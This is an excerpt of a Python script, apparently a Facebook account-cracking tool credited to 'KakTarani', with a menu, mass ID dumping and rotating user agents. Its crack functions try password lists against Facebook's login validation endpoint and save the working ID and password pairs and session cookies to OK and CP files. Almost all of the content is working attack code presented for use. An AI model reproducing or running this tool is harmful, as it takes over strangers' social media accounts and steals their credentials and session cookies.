...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mBAXER BEIT")
#------------------[ KakTarani-GOD ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ UPDATE TOOL BY KAKTARANI ]         \033[0;92m.           ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mKakTarani Yari ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK                 • KakTarani]            ║  \033[1;97m  
╠══[GITHUB                   • \33[1;38mGubxo ]   ║\33[1;34m   
...
os.system('espeak -a 300 " Baxer Beit,   Bo,  Tooly,  KakTarani,  "')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    KakTarani = input('\x1b[1;92m[+] CHOOSE: ')
    if KakTarani in ['111']:
        login()
        dump_massal()
    elif KakTarani in ['1']:
...
def setting():
    print('\033[0;91m=============================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mCrack FB Kon")
    print("\033[97;1m[\033[92;1m2\033[97;1m] Crack FB Taza")
    print("\033[97;1m[\033[92;1m3\033[97;1m] \033[0;92mCrack FB Kon+Taza")
    print('\033[0;91m=============================')
    ...
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mCOOKIES Pshan Adat \033[0;91mCP ID NOT SHOW\033[1;37m]")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[THE GOD KakTarani•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[THE GOD KakTarani-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[THE GOD KakTarani-Ok🤍] {idf} • {pw}\n\033[0;93m[👤]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " THE GOD KakTarani,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[THE GOD KakTarani-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•THE GOD KakTarani-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•THE GOD KakTarani-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  THE GOD KakTarani,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
